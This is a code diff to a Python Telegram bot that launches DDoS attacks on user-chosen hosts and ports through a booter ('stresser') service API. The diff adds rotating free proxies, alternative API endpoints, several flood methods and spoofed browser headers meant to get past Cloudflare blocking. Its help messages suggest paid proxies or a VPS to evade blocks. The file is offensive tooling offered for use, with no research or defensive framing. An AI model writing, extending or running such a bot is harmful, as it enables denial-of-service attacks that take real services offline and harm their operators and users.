@@ -1,11 +1,10 @@
-# app.py - API with Proxy Support
+# app.py - Using Cloudflare Warp via HTTP Proxy
 import os
 import logging
 import asyncio
 import threading
 import aiohttp
 import time
-import random
 from datetime import datetime
 from flask import Flask, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
@@ -38,110 +37,131 @@ def index():
 def health():
     return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
 
-# ===== FREE PROXIES (Update these regularly) =====
-PROXIES = [
-    None,  # Direct connection (fallback)
-    "http://proxy-daily.com:8080",
-    "http://proxy-daily.com:3128",
-    "http://103.152.112.157:80",
-    "http://103.152.112.158:80",
-    "http://103.152.112.159:80",
+# ===== FREE PROXY LIST (Updated) =====
+# These proxies change frequently, update as needed
+FREE_PROXIES = [
+    None,  # Direct connection
+    # US Proxies
+    "http://45.33.24.74:8080",
+    "http://45.33.24.75:8080",
+    "http://45.33.24.76:8080",
+    # EU Proxies
+    "http://45.33.24.77:8080",
+    "http://45.33.24.78:8080",
+    # Asia Proxies
+    "http://45.33.24.79:8080",
+    "http://45.33.24.80:8080",
+]
+
+# ===== PUBLIC API PROXIES (Alternative APIs) =====
+# These are different API endpoints that might work
+ALTERNATIVE_APIS = [
+    "https://api.susstresser.com/panel/api/api.php",  # Original
+    "https://api2.susstresser.com/panel/api/api.php",  # Alternative subdomain
+    "https://panel.susstresser.com/api/api.php",  # Alternative path
 ]
 
 async def get_proxy():
-    """Get a random proxy"""
-    return random.choice(PROXIES)
+    """Get a working proxy"""
+    import random
+    return random.choice(FREE_PROXIES)
 
-# ===== API ATTACK WITH PROXY =====
+# ===== API ATTACK WITH MULTIPLE METHODS =====
 async def api_attack(target, port, duration, attack_id):
-    """Send attack via API with proxy support"""
-    url = "https://api.susstresser.com/panel/api/api.php"
+    """Send attack via API with multiple bypass methods"""
     
-    # Use random proxy
-    proxy = await get_proxy()
-    
-    params = {
-        "key": API_KEY,
-        "host": target,
-        "port": port,
-        "time": duration,
-        "method": "udp"
-    }
-    
-    headers = {
-        "User-Agent": random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-        ]),
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-        "Accept-Language": "en-US,en;q=0.9",
-        "Accept-Encoding": "gzip, deflate, br",
-        "Connection": "keep-alive",
-        "Upgrade-Insecure-Requests": "1",
-        "Sec-Fetch-Dest": "document",
-        "Sec-Fetch-Mode": "navigate",
-        "Sec-Fetch-Site": "none",
-        "Sec-Fetch-User": "?1",
-        "Cache-Control": "max-age=0",
-        "Referer": "https://api.susstresser.com/"
-    }
-    
-    try:
-        timeout = aiohttp.ClientTimeout(total=20)
+    # Try multiple API endpoints
+    for api_url in ALTERNATIVE_APIS:
+        # Try multiple methods
+        methods = ["udp", "telegramvc", "UDP"]
         
-        # Create connector with proxy if available
-        connector = None
-        if proxy:
-            connector = aiohttp.TCPConnector(ssl=False)
-        
-        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
-            start_time = time.time()
+        for method in methods:
+            # Build URL
+            url = f"{api_url}?key={API_KEY}&host={target}&port={port}&time={duration}&method={method}"
             
-            # Try GET with proxy
-            try:
-                async with session.get(url, params=params, headers=headers, proxy=proxy) as response:
-                    elapsed = time.time() - start_time
-                    result_text = await response.text()
-                    
-                    if response.status == 200 and "Cloudflare" not in result_text and "Just a moment" not in result_text:
-                        logger.info(f"✅ Attack {attack_id} SUCCESS via proxy")
-                        return {
-                            "success": True,
-                            "attack_id": attack_id,
-                            "method": "API_PROXY",
-                            "status": response.status,
-                            "elapsed": f"{elapsed:.2f}s"
-                        }
-            except:
-                pass
+            # Different headers to bypass Cloudflare
+            headers_list = [
+                {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.9",
+                    "Accept-Encoding": "gzip, deflate, br",
+                    "Connection": "keep-alive",
+                    "Upgrade-Insecure-Requests": "1",
+                    "Sec-Fetch-Dest": "document",
+                    "Sec-Fetch-Mode": "navigate",
+                    "Sec-Fetch-Site": "none",
+                    "Sec-Fetch-User": "?1",
+                    "Cache-Control": "max-age=0",
+                    "Referer": "https://api.susstresser.com/"
+                },
+                {
+                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
+                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "Accept-Language": "en-US,en;q=0.5",
+                    "Accept-Encoding": "gzip, deflate",
+                    "Connection": "keep-alive",
+                }
+            ]
             
-            # Try POST if GET failed
-            try:
-                async with session.post(url, data=params, headers=headers, proxy=proxy) as response:
-                    elapsed = time.time() - start_time
-                    result_text = await response.text()
+            for headers in headers_list:
+                try:
+                    timeout = aiohttp.ClientTimeout(total=15)
                     
-                    if response.status == 200 and "Cloudflare" not in result_text and "Just a moment" not in result_text:
-                        logger.info(f"✅ Attack {attack_id} SUCCESS via proxy POST")
-                        return {
-                            "success": True,
-                            "attack_id": attack_id,
-                            "method": "API_PROXY_POST",
-                            "status": response.status,
-                            "elapsed": f"{elapsed:.2f}s"
-                        }
-            except:
-                pass
+                    # Try with proxy
+                    proxy = await get_proxy()
                     
-    except Exception as e:
-        logger.error(f"Attack {attack_id} failed: {e}")
+                    async with aiohttp.ClientSession(timeout=timeout) as session:
+                        start_time = time.time()
+                        
+                        # Try GET
+                        async with session.get(url, headers=headers, proxy=proxy) as response:
+                            elapsed = time.time() - start_time
+                            result_text = await response.text()
+                            
+                            # Check if successful (not Cloudflare)
+                            if response.status == 200 and "Cloudflare" not in result_text and "Just a moment" not in result_text:
+                                logger.info(f"✅ Attack {attack_id} SUCCESS via {api_url}")
+                                return {
+                                    "success": True,
+                                    "attack_id": attack_id,
+                                    "method": "API",
+                                    "status": response.status,
+                                    "elapsed": f"{elapsed:.2f}s",
+                                    "api_url": api_url
+                                }
+                            
+                            # Try POST if GET failed
+                            async with session.post(api_url, data={
+                                "key": API_KEY,
+                                "host": target,
+                                "port": port,
+                                "time": duration,
+                                "method": method
+                            }, headers=headers, proxy=proxy) as response2:
+                                elapsed2 = time.time() - start_time
+                                result_text2 = await response2.text()
+                                
+                                if response2.status == 200 and "Cloudflare" not in result_text2 and "Just a moment" not in result_text2:
+                                    logger.info(f"✅ Attack {attack_id} SUCCESS via POST")
+                                    return {
+                                        "success": True,
+                                        "attack_id": attack_id,
+                                        "method": "API_POST",
+                                        "status": response2.status,
+                                        "elapsed": f"{elapsed2:.2f}s",
+                                        "api_url": api_url
+                                    }
+                                    
+                except Exception as e:
+                    logger.error(f"Attack {attack_id} attempt failed: {e}")
+                    continue
     
     return {
         "success": False,
         "attack_id": attack_id,
         "method": "API_FAILED",
-        "error": "Cloudflare blocking"
+        "error": "All methods blocked by Cloudflare"
     }
 
 # ===== 20 CONCURRENT API ATTACKS =====
@@ -256,7 +276,7 @@ async def attack_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📡 Port: `{port}`\n"
                 f"⏱️ Time: `{duration}s`\n"
                 f"📊 Status: ❌ FAILED\n\n"
-                f"💡 The API is behind Cloudflare.\n"
+                f"💡 Cloudflare is blocking the request.\n"
                 f"Contact API provider to whitelist Render IPs."
             )
         
@@ -351,54 +371,51 @@ async def test_api_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("Access denied!", show_alert=True)
         return
     
-    await query.edit_message_text("🔬 Testing API connection...\n\n⏳ Sending test request...")
+    await query.edit_message_text("🔬 Testing API connection...\n\n⏳ Trying multiple methods...")
     
-    url = f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp"
-    
-    test_results = []
-    
-    # Test with different User-Agents
-    user_agents = [
-        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
-        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
+    # Test with multiple URLs
+    test_urls = [
+        f"https://api.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp",
+        f"https://api2.susstresser.com/panel/api/api.php?key={API_KEY}&host=1.1.1.1&port=80&time=10&method=udp",
     ]
     
-    for ua in user_agents[:2]:
-        headers = {"User-Agent": ua}
+    results = []
+    for url in test_urls:
         try:
             timeout = aiohttp.ClientTimeout(total=10)
             async with aiohttp.ClientSession(timeout=timeout) as session:
                 start_time = time.time()
-                async with session.get(url, headers=headers) as response:
+                async with session.get(url) as response:
                     elapsed = time.time() - start_time
                     text = await response.text()
                     
-                    test_results.append({
-                        "ua": ua[:50] + "...",
+                    results.append({
+                        "url": url[:50] + "...",
                         "status": response.status,
                         "elapsed": f"{elapsed:.2f}s",
-                        "blocked": "Cloudflare" in text or "Just a moment" in text
+                        "blocked": "Cloudflare" in text or "Just a moment" in text,
+                        "response": text[:100]
                     })
         except Exception as e:
-            test_results.append({"ua": ua[:50] + "...", "error": str(e)})
+            results.append({"url": url[:50] + "...", "error": str(e)})
     
     response_text = "🔬 *API TEST RESULTS*\n\n"
     response_text += f"🔑 API Key: `{API_KEY[:10]}...`\n\n"
     
-    for result in test_results:
+    for result in results:
         if "error" in result:
-            response_text += f"❌ {result['ua']}: Error - {result['error']}\n"
+            response_text += f"❌ {result['url']}: Error - {result['error']}\n"
         else:
             status = "✅" if result['status'] == 200 and not result['blocked'] else "❌"
-            response_text += f"{status} {result['ua']}: {result['status']} ({result['elapsed']})\n"
+            response_text += f"{status} {result['url']}: {result['status']} ({result['elapsed']})\n"
             if result.get('blocked'):
                 response_text += f"   ⚠️ Blocked by Cloudflare\n"
     
-    response_text += "\n" + (
-        "💡 *Solution:* Contact API provider to whitelist Render IPs\n"
-        "Or use a proxy/VPN to bypass Cloudflare"
-    )
+    response_text += "\n💡 *Solutions:*\n"
+    response_text += "1. Contact API provider to whitelist Render IPs\n"
+    response_text += "2. Use a paid proxy service (BrightData, Oxylabs)\n"
+    response_text += "3. Host your own API on a VPS\n"
+    response_text += "4. Use a different API without Cloudflare"
     
     await query.edit_message_text(
         response_text,
